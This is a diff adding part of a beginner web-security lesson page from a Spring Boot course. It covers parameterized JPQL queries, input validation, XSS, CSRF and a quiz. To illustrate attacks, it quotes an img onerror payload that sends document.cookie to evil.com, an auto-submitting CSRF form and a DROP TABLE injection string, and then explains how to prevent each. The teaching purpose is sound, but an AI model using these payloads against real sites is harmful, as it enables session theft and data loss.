+       "(LOWER(j.jobTitle) LIKE LOWER(CONCAT('%', :keyword, '%')) OR " +
+       " LOWER(j.employerName) LIKE LOWER(CONCAT('%', :keyword, '%'))) " +
+       "AND LOWER(j.jobState) = LOWER(:state)")
+List&lt;Job&gt; searchByKeywordAndState(@Param("keyword") String keyword,
+                                    @Param("state") String state);</code></pre>
+      </div>
+
+      <p>Two parameters, both safe, both parameterized. The query finds jobs matching the keyword that are also in the specified state. As your application grows, you can add as many filter combinations as you need.</p>
+
+      <div class="callout callout-tip">
+        <strong>Tip:</strong> For very complex filter combinations (keyword + state + salary + sort), consider using Spring Data JPA's <code>Specification</code> interface or <code>Querydsl</code>. These let you build queries dynamically by composing filter criteria. But for a project with a few filter options, individual repository methods like these are perfectly clean and maintainable.
+      </div>
+
+      <!-- ==================== PART 7 — INPUT VALIDATION ==================== -->
+      <h2>7. Input Validation</h2>
+
+      <p>Parameterized queries protect you from SQL injection, but security does not stop there. You also need to validate and sanitize user input before it reaches your application logic. Think of it as defense in depth &mdash; multiple layers of protection, so that if one layer fails, the others still keep you safe.</p>
+
+      <h3>Input Length Limits</h3>
+
+      <p>What happens if someone pastes 10,000 characters into your search box? Or 100,000? Without limits, your application would try to search for a 100,000-character keyword, which could slow down your database query, consume excessive memory, or be used as part of a denial-of-service attack.</p>
+
+      <p>Add a length limit with the <code>@Size</code> annotation from Jakarta Validation:</p>
+
+      <div class="code-editor" data-language="java" data-editable="true" data-runnable="false">
+        <pre><code>@GetMapping("/local")
+public List&lt;Job&gt; searchLocal(@RequestParam @Size(max = 200) String keyword) {
+    return jobRepository.searchByKeyword(keyword.trim());
+}</code></pre>
+      </div>
+
+      <p>The <code>@Size(max = 200)</code> annotation tells Spring to reject any request where the keyword is longer than 200 characters. Spring will automatically return a <code>400 Bad Request</code> error if the limit is exceeded. You also want to make sure you have the <code>spring-boot-starter-validation</code> dependency in your <code>pom.xml</code>:</p>
+
+      <div class="code-editor" data-language="xml" data-editable="false" data-runnable="false">
+        <pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt;
+&lt;/dependency&gt;</code></pre>
+      </div>
+
+      <p>You also need the <code>@Validated</code> annotation on your controller class for the <code>@Size</code> constraint to be enforced:</p>
+
+      <div class="code-editor" data-language="java" data-editable="false" data-runnable="false">
+        <pre><code>@RestController
+@RequestMapping("/api/jobs")
+@Validated  // Enables method-level validation
+public class JobController {
+    // ...
+}</code></pre>
+      </div>
+
+      <p>Notice we also call <code>keyword.trim()</code> to remove leading and trailing whitespace. A user might accidentally type <code>"  developer  "</code> with spaces. Trimming ensures the search works as expected. You should also consider what happens if the user sends an empty string after trimming &mdash; you can add a check and return an empty list immediately instead of running a database query for nothing:</p>
+
+      <div class="code-editor" data-language="java" data-editable="true" data-runnable="false">
+        <pre><code>@GetMapping("/local")
+public List&lt;Job&gt; searchLocal(@RequestParam @Size(max = 200) String keyword) {
+    String trimmed = keyword.trim();
+    if (trimmed.isEmpty()) {
+        return List.of();  // Return empty list, no database query needed
+    }
+    return jobRepository.searchByKeyword(trimmed);
+}</code></pre>
+      </div>
+
+      <h3>Cross-Site Scripting (XSS)</h3>
+
+      <p>SQL injection is about attacking your <strong>database</strong>. Cross-Site Scripting &mdash; XSS &mdash; is about attacking your <strong>users</strong>. It works differently but is just as dangerous.</p>
+
+      <p>Imagine someone types this into your search box:</p>
+
+      <div class="error-display">&lt;script&gt;alert('hacked')&lt;/script&gt;</div>
+
+      <p>If your application takes that text and inserts it into the page using <code>.innerHTML</code>, the browser sees a <code>&lt;script&gt;</code> tag and <em>executes it</em>. In this example, it just shows an alert box. But a real attacker would not show an alert. They would inject JavaScript that:</p>
+
+      <ul>
+        <li>Steals the user's session cookie and sends it to the attacker's server</li>
+        <li>Redirects the user to a fake login page to harvest their password</li>
+        <li>Modifies the page content to show false information</li>
+        <li>Installs a keylogger that captures everything the user types</li>
+      </ul>
+
+      <p>This is XSS. The attacker "injects" JavaScript through user input, and it executes in the victim's browser.</p>
+
+      <p>The good news: you already know how to prevent this, and you have been doing it.</p>
+
+      <p><strong>In Thymeleaf:</strong> The <code>th:text</code> attribute <strong>automatically escapes HTML characters</strong>. If you display user input with <code>th:text</code>, the text <code>&lt;script&gt;alert('hacked')&lt;/script&gt;</code> is rendered as the literal string <code>&amp;lt;script&amp;gt;alert('hacked')&amp;lt;/script&amp;gt;</code> in the HTML. The browser displays it as text, not as a script tag. It never executes. You are safe.</p>
+
+      <div class="callout callout-warning">
+        <strong>Danger zone:</strong> Thymeleaf's <code>th:utext</code> attribute does <strong>NOT</strong> escape HTML. The "u" stands for "unescaped." Never use <code>th:utext</code> with user-provided data. Only use it for content you fully control, like pre-written HTML snippets from your own code.
+      </div>
+
+      <p><strong>In JavaScript:</strong> Use <code>.textContent</code>, not <code>.innerHTML</code>. This is a lesson you learned way back in Lesson 6, and now you understand the full security reason behind it. When you set <code>element.textContent = userInput</code>, the browser treats the value as plain text. It does not parse HTML tags or execute scripts. When you set <code>element.innerHTML = userInput</code>, the browser <em>does</em> parse the HTML, and any <code>&lt;script&gt;</code> tags will execute.</p>
+
+      <p>Look back at the <code>displayResults</code> function from Part 5. Every place where we display data from the server &mdash; job titles, company names, locations &mdash; we use <code>.textContent</code>:</p>
+
+      <div class="code-editor" data-language="javascript" data-editable="false" data-runnable="false">
+        <pre><code>const title = document.createElement('h3');
+title.textContent = job.jobTitle;  // SAFE — renders as text, never as HTML
+
+// vs
+
+title.innerHTML = job.jobTitle;    // DANGEROUS — would execute any HTML/scripts</code></pre>
+      </div>
+
+      <p>To make this concrete, imagine a malicious user somehow got a job listing into your database with the title <code>&lt;img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie"&gt;</code>. If you render that with <code>.innerHTML</code>, the browser creates an <code>&lt;img&gt;</code> tag, fails to load the image (since <code>src=x</code> is invalid), triggers the <code>onerror</code> handler, and redirects the user to the attacker's website &mdash; sending the user's session cookie along with it. The attacker can now impersonate that user.</p>
+
+      <p>With <code>.textContent</code>, the browser displays that entire string as literal text on the page. No image tag is created. No error handler fires. No cookie is stolen. The user sees an ugly string, but they are safe.</p>
+
+      <div class="key-concept">
+        <h4>The .textContent vs .innerHTML Rule</h4>
+        <p>Use <code>.textContent</code> when displaying any data that came from a user, a database, or an API. Use <code>.innerHTML</code> only when you are inserting HTML that you wrote yourself and that contains no user-provided data. When in doubt, use <code>.textContent</code>.</p>
+      </div>
+
+      <h3>Rate Limiting</h3>
+
+      <p>Even with validation and sanitization, you should consider limiting how often a single user can make requests. If someone writes a script that sends 1,000 search requests per second to your local search endpoint, it could overwhelm your database. This is called a <strong>denial-of-service</strong> (DoS) attack.</p>
+
+      <p>Rate limiting is a broad topic that we will not implement in full here, but be aware that it exists. In production, you would use tools like Spring Security's rate limiter, a reverse proxy like Nginx with rate limiting configuration, or a cloud service like AWS WAF or Cloudflare. The concept is simple: track how many requests each client makes within a time window, and reject requests that exceed the limit.</p>
+
+      <div class="callout callout-info">
+        <strong>Defense in depth:</strong> Good security is never just one thing. It is layers: parameterized queries protect the database, HTML escaping protects the browser, input validation limits what gets processed, rate limiting prevents abuse, and HTTPS encrypts everything in transit. Each layer handles a different threat. Together, they make your application resilient.
+      </div>
+
+      <!-- ==================== PART 8 — THE THREE VULNERABILITIES ==================== -->
+      <h2>8. The Three Vulnerabilities Every Developer Must Know</h2>
+
+      <p>You now understand the two most common web application vulnerabilities in practical detail. Let us put them in context alongside one more that you should know about, and then look at the broader security landscape.</p>
+
+      <table class="lesson-table">
+        <thead>
+          <tr>
+            <th>Vulnerability</th>
+            <th>What It Does</th>
+            <th>How You Prevent It</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>SQL Injection</strong></td>
+            <td>Attacker injects malicious SQL through user input to read, modify, or delete database data</td>
+            <td>Parameterized queries (<code>@Query</code> with <code>@Param</code>, Spring Data JPA methods). Never concatenate user input into SQL strings.</td>
+          </tr>
+          <tr>
+            <td><strong>XSS (Cross-Site Scripting)</strong></td>
+            <td>Attacker injects malicious JavaScript through user input to steal cookies, redirect users, or modify page content</td>
+            <td>Thymeleaf's <code>th:text</code> (auto-escapes HTML). In JavaScript, use <code>.textContent</code> instead of <code>.innerHTML</code>. Never render raw user input as HTML.</td>
+          </tr>
+          <tr>
+            <td><strong>CSRF (Cross-Site Request Forgery)</strong></td>
+            <td>Attacker tricks a logged-in user's browser into making unwanted requests (e.g., transferring money, changing a password) by embedding a hidden form on a malicious website</td>
+            <td>CSRF tokens &mdash; Spring Security generates a unique token for each session and requires it on every state-changing request. If the token is missing or wrong, the request is rejected.</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p>You have directly addressed SQL injection and XSS in this lesson. CSRF is the third member of this critical trio, and it is worth understanding how it works even though it does not apply to your current application yet.</p>
+
+      <p>Here is a CSRF scenario: imagine your Resumator had a user login system. You log in to your account. Your browser now has a session cookie that proves you are authenticated. While you are still logged in, you visit a different website &mdash; maybe a forum or a blog. That website has a hidden form embedded in the page:</p>
+
+      <div class="code-editor" data-language="html" data-editable="false" data-runnable="false">
+        <pre><code>&lt;!-- Hidden on a malicious website --&gt;
+&lt;form action="https://your-resumator.com/api/account/delete" method="POST"&gt;
+  &lt;input type="hidden" name="confirm" value="yes" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
+      </div>
+
+      <p>The malicious page automatically submits a form to your Resumator. Because your browser still has the session cookie, the request looks legitimate to your server. Your account gets deleted &mdash; and you never clicked anything on your Resumator site. That is CSRF: the attacker "forged" a request that appeared to come from you.</p>
+
+      <p>CSRF tokens prevent this. Spring Security generates a unique, unpredictable token for each user session and requires it on every state-changing request (POST, PUT, DELETE). The malicious website cannot know the token because it is unique to your session and never exposed to other sites. Without the correct token, the request is rejected. You have not needed to worry about CSRF yet because your application does not have user authentication &mdash; there is no logged-in user to trick. But when you add Spring Security in the future, CSRF protection is enabled by default.</p>
+
+      <h3>Other Security Concepts</h3>
+
+      <p>Beyond these three core vulnerabilities, there are several other security practices that every developer should be aware of:</p>
+
+      <ul>
+        <li><strong>HTTPS:</strong> Encrypts all data in transit between the browser and your server. Without HTTPS, anyone on the same network (a coffee shop Wi-Fi, for example) can read everything your users send and receive &mdash; including passwords, session cookies, and personal data. In production, HTTPS is non-negotiable.</li>
+        <li><strong>Password hashing:</strong> Never store passwords as plain text. If your database is breached, every user's password would be exposed. Instead, use a one-way hash function like <strong>bcrypt</strong>. Spring Security provides built-in bcrypt support. The hash is irreversible &mdash; even if an attacker gets the hash, they cannot determine the original password (at least not without enormous computational effort).</li>
+        <li><strong>API key security:</strong> Never put API keys in frontend code or commit them to git. You learned this in Lesson 23 when you set up your JSearch API key in <code>application.properties</code> and added that file to <code>.gitignore</code>. If an API key is exposed in a public GitHub repository, automated bots will find it within minutes and abuse it.</li>
+        <li><strong>Principle of least privilege:</strong> Give every user and service only the minimum permissions they need. You already practiced this &mdash; in Lesson 23, you created a dedicated <code>resumator_app</code> database user with access only to the <code>resumator</code> database, instead of using the MySQL root account. If that database user's credentials were ever compromised, the attacker could only access one database, not your entire MySQL server.</li>
+        <li><strong>Keep dependencies updated:</strong> Libraries and frameworks regularly release security patches. An outdated dependency with a known vulnerability is an open door for attackers. Tools like <code>mvn versions:display-dependency-updates</code> or GitHub's Dependabot can alert you when updates are available.</li>
+      </ul>
+
+      <div class="key-concept">
+        <h4>Security Is Everyone's Responsibility</h4>
+        <p>Security is not someone else's job. Every line of code you write either makes your application more secure or less secure. Every developer is responsible for writing secure code &mdash; using parameterized queries, escaping output, validating input, protecting secrets, and keeping dependencies updated. These are not optional best practices. They are fundamental requirements of professional software development.</p>
+      </div>
+
+      <!-- ==================== PART 9 — SECURITY RESOURCES ==================== -->
+      <h2>9. Security Resources</h2>
+
+      <p>This lesson gave you the practical foundation &mdash; the vulnerabilities you are most likely to encounter and the specific techniques to prevent them. But security is a vast field, and there is always more to learn. Here are the resources that the security community considers essential:</p>
+
+      <div class="callout callout-info">
+        <strong>Recommended Security Resources:</strong>
+        <ul>
+          <li><strong>OWASP Top 10</strong> &mdash; The industry standard list of the ten most critical web application security risks, updated regularly. SQL injection, XSS, and CSRF are all on it. Every developer should read this at least once. (<a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener noreferrer">owasp.org</a>)</li>
+          <li><strong>OWASP Cheat Sheet Series</strong> &mdash; Practical, concise guides on specific security topics. There are cheat sheets for SQL injection prevention, XSS prevention, authentication, session management, and dozens more. Excellent reference material.</li>
+          <li><strong>Spring Security Documentation</strong> &mdash; When you are ready to add authentication and authorization to your Spring Boot applications, this is the definitive guide. Spring Security is comprehensive and well-documented.</li>
+          <li><strong>"The Web Application Hacker's Handbook"</strong> by Dafydd Stuttard &mdash; Considered the bible of web application security testing. Covers attack techniques and defenses in deep detail. A dense but invaluable read for anyone serious about security.</li>
+          <li><strong>PortSwigger Web Security Academy</strong> &mdash; Free, hands-on training labs from the creators of Burp Suite (a professional security testing tool). You can practice real attacks in a safe environment. Outstanding for building practical skills. (<a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer">portswigger.net</a>)</li>
+          <li><strong>HackTheBox and TryHackMe</strong> &mdash; Gamified platforms where you learn security by hacking intentionally vulnerable machines and applications. TryHackMe is more beginner-friendly; HackTheBox is more advanced. Both are excellent for hands-on learning.</li>
+        </ul>
+      </div>
+
+      <p>Security is an entire career path. Roles like <strong>Information Security (InfoSec)</strong> engineer, <strong>Application Security (AppSec)</strong> engineer, and <strong>penetration tester</strong> are among the highest-paying positions in the technology industry. Companies pay a premium for people who can find and fix security vulnerabilities before attackers exploit them.</p>
+
+      <p>Even if you do not specialize in security, the knowledge you gained in this lesson is not optional. Every developer writes code that handles user input, queries databases, and renders data in browsers. Every developer is responsible for doing those things securely. The difference between a junior developer and a senior developer is not just knowing how to build features &mdash; it is knowing how to build features that cannot be exploited.</p>
+
+      <p>In job interviews, security questions come up regularly. "How do you prevent SQL injection?" "What is XSS and how do you guard against it?" "How do you handle sensitive data like API keys?" You can now answer all of these confidently, with specific technical detail and real examples. That alone sets you apart from many candidates who learned to build features but never learned to build them safely.</p>
+
+      <!-- ==================== QUIZ ==================== -->
+      <h2>Test Your Knowledge</h2>
+
+      <div class="quiz" data-id="q29-1">
+        <p class="quiz-question">1. What is SQL injection and how do parameterized queries prevent it?</p>
+        <div class="quiz-options">
+          <label><input type="radio" name="q29-1" value="a"> SQL injection is when the database runs out of memory from too many queries. Parameterized queries prevent it by caching results.</label>
+          <label><input type="radio" name="q29-1" value="b"> SQL injection is when an attacker inserts malicious SQL through user input. Parameterized queries send the query structure and values separately, so user input is always treated as data, never as executable SQL.</label>
+          <label><input type="radio" name="q29-1" value="c"> SQL injection is when an attacker accesses the database directly over the network. Parameterized queries prevent it by encrypting the connection.</label>
+          <label><input type="radio" name="q29-1" value="d"> SQL injection is a type of XSS attack that targets database servers. Parameterized queries prevent it by sanitizing HTML in the input.</label>
+        </div>
+        <div class="quiz-answer" data-correct="b">SQL injection is when an attacker inserts malicious SQL through user input. Parameterized queries send the query structure and values separately, so user input is always treated as data, never as executable SQL. The database compiles the query structure first, then plugs in the parameter values without re-parsing. This means even if a user types <code>'; DROP TABLE jobs; --</code>, the database searches for that literal string instead of executing it as a command.</div>
+      </div>
+
+      <div class="quiz" data-id="q29-2">
+        <p class="quiz-question">2. Why is local search preferable to API search when the data already exists?</p>
+        <div class="quiz-options">
+          <label><input type="radio" name="q29-2" value="a"> Local search returns more accurate results because the database has better algorithms than the API.</label>
+          <label><input type="radio" name="q29-2" value="b"> Local search is free (no API quota used), instant (no network latency), and unlimited, making it the smart default when previously fetched data already contains relevant results.</label>
+          <label><input type="radio" name="q29-2" value="c"> Local search is required because APIs do not allow repeated queries for the same search terms.</label>
+          <label><input type="radio" name="q29-2" value="d"> Local search is faster because MySQL is always faster than any external API, regardless of the data volume.</label>
+        </div>
+        <div class="quiz-answer" data-correct="b">Local search is free (no API quota used), instant (no network latency), and unlimited, making it the smart default when previously fetched data already contains relevant results. With a limited monthly API quota (200 requests for JSearch's free tier), every API call is valuable. Searching your local database costs nothing, has zero network delay, and can be performed as many times as you want. The API should be reserved for when you genuinely need fresh results from across the internet.</div>
+      </div>
+
+      <div class="quiz" data-id="q29-3">
+        <p class="quiz-question">3. What does Thymeleaf's <code>th:text</code> do that prevents XSS attacks?</p>
+        <div class="quiz-options">
+          <label><input type="radio" name="q29-3" value="a"> <code>th:text</code> removes all HTML tags from the output, leaving only plain text with no formatting.</label>
+          <label><input type="radio" name="q29-3" value="b"> <code>th:text</code> encrypts the output so that JavaScript cannot read it from the DOM.</label>
+          <label><input type="radio" name="q29-3" value="c"> <code>th:text</code> automatically escapes HTML characters in the output, converting characters like <code>&lt;</code> and <code>&gt;</code> to their safe entity equivalents so they display as text rather than being executed as HTML or JavaScript.</label>
+          <label><input type="radio" name="q29-3" value="d"> <code>th:text</code> blocks any output that contains the word "script" to prevent code execution.</label>
+        </div>
+        <div class="quiz-answer" data-correct="c"><code>th:text</code> automatically escapes HTML characters in the output, converting characters like <code>&lt;</code> and <code>&gt;</code> to their safe entity equivalents (<code>&amp;lt;</code> and <code>&amp;gt;</code>) so they display as text rather than being executed as HTML or JavaScript. This means if user input contains <code>&lt;script&gt;alert('hacked')&lt;/script&gt;</code>, Thymeleaf renders it as the visible text "&lt;script&gt;alert('hacked')&lt;/script&gt;" on the page &mdash; the browser never interprets it as an actual script tag.</div>
+      </div>
+
+      <!-- ==================== DELIVERABLE ==================== -->
+      <h2>Lesson Summary</h2>
+
+      <p>This was a lesson that combined practical feature development with critical security knowledge. You did not just add a search feature &mdash; you learned <em>why</em> certain coding practices exist, what happens when they are ignored, and how the tools you have been using all along were protecting you from real attacks.</p>
+
+      <div class="key-concept">
+        <h4>What You Built</h4>
+        <p>Your Resumator now has dual search modes (local database and API), parameterized queries throughout, input validation, and you understand the critical security vulnerabilities that every web developer must guard against.</p>
+      </div>
+
+      <p>Here is what you accomplished in this lesson:</p>
+
+      <ul>
+        <li><strong>You built a local search feature</strong> that queries your database by keyword, checking job titles, company names, and cities with case-insensitive matching using JPQL.</li>
+        <li><strong>You learned about SQL injection</strong> &mdash; how it works, why it is devastating, and how parameterized queries completely prevent it by separating query structure from user data.</li>
+        <li><strong>You built a dual-mode search UI</strong> with tab switching between local and API search, complete with a job count display that makes your local database feel like a valuable asset.</li>
+        <li><strong>You added filters and sort options</strong> &mdash; by state, by salary, by date, by company name &mdash; all using safe, parameterized Spring Data JPA methods.</li>
+        <li><strong>You understood XSS</strong> and why <code>.textContent</code> and <code>th:text</code> are your first line of defense against script injection in the browser.</li>
+        <li><strong>You added input validation</strong> with <code>@Size</code> and <code>.trim()</code> to limit and clean user input before processing.</li>
+        <li><strong>You learned the three critical web vulnerabilities</strong> (SQL injection, XSS, CSRF) and the broader security concepts that every developer must understand.</li>
+      </ul>
+
+      <p>In the next and final lesson, you will step back and look at the entire journey &mdash; from your first HTML tag to a complete, secure, full-stack web application. You will review what you built, reflect on what you learned, and explore where to go next.</p>
+
+    </div>
+
+    <div class="mark-complete-section">
+      <p>Finished this lesson?</p>
+      <button id="mark-complete-btn" class="btn btn-success btn-lg" data-track="resumator" data-lesson="29-search-security">Mark Complete</button>
+    </div>
+
+    <div class="lesson-nav">
+      <a href="/lessons/resumator/28-api-tracking-thymeleaf.html" class="lesson-nav-btn">&larr; Previous: API Tracking with Thymeleaf</a>
+      <a href="/lessons/resumator/30-review-whats-next.html" class="lesson-nav-btn">Next: Review &amp; What's Next &rarr;</a>
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-left">&copy; 2025 Coders Farm</div>
+      <ul class="footer-links">
+        <li><a href="https://github.com/coders-farm-official">GitHub</a></li>
+        <li><a href="https://codersfarm.org">codersfarm.org</a></li>
+      </ul>
+    </div>
+  </footer>
+
+  <script src="/js/theme.js"></script>
+  <script src="/js/progress.js"></script>
+  <script src="/js/quiz.js"></script>
+  <script src="/js/editor.js"></script>
+  <script src="/js/runner.js"></script>
+  <script src="/js/lessons.js"></script>
+  <script src="/js/app.js"></script>
+</body>
+</html>
